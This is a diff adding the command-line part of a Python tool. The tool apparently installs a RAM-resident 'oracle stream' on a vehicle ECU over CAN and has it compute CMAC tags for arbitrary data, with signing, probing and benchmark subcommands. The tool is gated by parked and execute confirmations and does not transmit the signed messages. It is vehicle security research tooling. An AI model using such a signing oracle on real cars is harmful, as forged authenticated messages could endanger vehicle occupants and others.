+        "transport": {
+            "request": "0x7A1 classic ISO-TP, 40-byte N-SDU C9 C9 seq || domain36 || seq^FF",
+            "response": "0x7A9 classic 8-byte frame 07 C9 seq status cmac_first4",
+            "target_period_ms": 25,
+        },
+        "field_sequence": [
+            "OFF -> NRTD/Park/stationary; install and require runtime_08a_oracle_stream_live",
+            "transition directly to READY/Park/stationary without OFF",
+            "run known-answer; require MAC28 d64e2a5 for the Experiment-A stock domain",
+            "run benchmark at 25 ms period before integrating any 0x08A host transmission",
+            "power OFF to remove the resident",
+        ],
+        "boundaries": {
+            "persistent_flash_write": False, "transmitted_08a": False, "transmitted_b6": False,
+            "key_extraction": False, "accepted_data_id": "0x008A only",
+        },
+    }
+
+
+def parser() -> argparse.ArgumentParser:
+    ap = argparse.ArgumentParser(description=__doc__)
+    sub = ap.add_subparsers(dest="command", required=True)
+    p = sub.add_parser("plan"); p.add_argument("--payload", type=Path)
+    p = sub.add_parser("install"); p.add_argument("--payload", type=Path, required=True); p.add_argument("--execute", action="store_true"); p.add_argument("--nrtd-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("status"); p.add_argument("--parked-stationary-confirmed", action="store_true")
+    p = sub.add_parser("sign"); p.add_argument("--input-hex", required=True); p.add_argument("--seq", type=lambda v: int(v, 0), default=1); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("known-answer"); p.add_argument("--seq", type=lambda v: int(v, 0), default=1); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("transport-probe"); p.add_argument("--cf-gap-ms", type=float, required=True); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("transport-probe-no-fc"); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("transport-probe-fixed-delay"); p.add_argument("--delay-ms", type=float, required=True); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("benchmark"); p.add_argument("--count", type=int, default=20); p.add_argument("--period-ms", type=float, default=25.0); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("benchmark-fast"); p.add_argument("--count", type=int, default=20); p.add_argument("--period-ms", type=float, default=25.0); p.add_argument("--cf-gap-ms", type=float, default=0.0); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("benchmark-fixed-delay"); p.add_argument("--count", type=int, default=20); p.add_argument("--period-ms", type=float, default=25.0); p.add_argument("--delay-ms", type=float, default=5.0); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    p = sub.add_parser("benchmark-pipelined"); p.add_argument("--count", type=int, default=100); p.add_argument("--period-ms", type=float, default=25.0); p.add_argument("--delay-ms", type=float, default=5.0); p.add_argument("--execute", action="store_true"); p.add_argument("--parked-stationary-confirmed", action="store_true"); p.add_argument("--output", type=Path)
+    return ap
+
+
+def _emit(result: dict[str, Any], output: Path | None = None) -> None:
+    if output:
+        output.parent.mkdir(parents=True, exist_ok=True)
+        output.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+    print(json.dumps(result, indent=2, sort_keys=True))
+
+
+def main() -> int:
+    args = parser().parse_args()
+    try:
+        if args.command == "plan":
+            _emit(plan(args.payload)); return 0
+        if args.command == "install":
+            if not args.execute:
+                _emit(plan(args.payload)); return 0
+            if not args.nrtd_confirmed:
+                raise OracleStreamError("install --execute requires --nrtd-confirmed")
+            result = install(args.payload); _emit(result, args.output)
+            return 0 if result.get("verdict") == "runtime_08a_oracle_stream_live" else 3
+        if not args.parked_stationary_confirmed:
+            raise OracleStreamError(f"{args.command} requires --parked-stationary-confirmed")
+        session = OracleStreamSession(require_ready_parked=True)
+        if args.command == "status":
+            _emit(session.read_state()); return 0
+        if not args.execute:
+            raise OracleStreamError(f"{args.command} requires --execute")
+        if args.command == "known-answer":
+            result = known_answer(session, seq=args.seq); _emit(result, args.output)
+            return 0 if result["matched"] else 3
+        if args.command == "transport-probe":
+            result = transport_probe(session, cf_gap_ms=args.cf_gap_ms); _emit(result, args.output)
+            return 0 if result["matched"] else 3
+        if args.command == "transport-probe-no-fc":
+            result = transport_probe_no_fc(session); _emit(result, args.output)
+            return 0 if result["matched"] else 3
+        if args.command == "transport-probe-fixed-delay":
+            result = transport_probe_fixed_delay(session, delay_ms=args.delay_ms); _emit(result, args.output)
+            return 0 if result["matched"] else 3
+        if args.command == "benchmark":
+            result = benchmark(session, count=args.count, period_ms=args.period_ms); _emit(result, args.output)
+            return 0 if result["success_count"] == result["count"] else 3
+        if args.command == "benchmark-fast":
+            result = benchmark(
+                session, count=args.count, period_ms=args.period_ms, cf_gap_ms=args.cf_gap_ms,
+            )
+            _emit(result, args.output)
+            return 0 if result["success_count"] == result["count"] else 3
+        if args.command == "benchmark-fixed-delay":
+            result = benchmark(
+                session, count=args.count, period_ms=args.period_ms, cf_gap_ms=0.0,
+                skip_flow_control=True, pre_cf_delay_ms=args.delay_ms,
+            )
+            _emit(result, args.output)
+            return 0 if result["success_count"] == result["count"] else 3
+        if args.command == "benchmark-pipelined":
+            result = benchmark_pipelined(
+                session, count=args.count, period_ms=args.period_ms,
+                pre_cf_delay_ms=args.delay_ms,
+            )
+            _emit(result, args.output)
+            return 0 if (
+                result["success_count"] == result["count"]
+                and all(v == result["count"] for v in result["resident_counter_deltas"].values())
+            ) else 3
+        try:
+            domain = bytes.fromhex(args.input_hex)
+        except ValueError as exc:
+            raise OracleStreamError("input is not valid hexadecimal") from exc
+        result = session.sign(domain, seq=args.seq); _emit(result, args.output)
+        return 0 if result.get("status") == 0 else 3
+    except (OracleStreamError, RamExecError, OSError, ValueError, TimeoutError) as exc:
+        print(f"refusing: {exc}", file=sys.stderr)
+        return 2
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
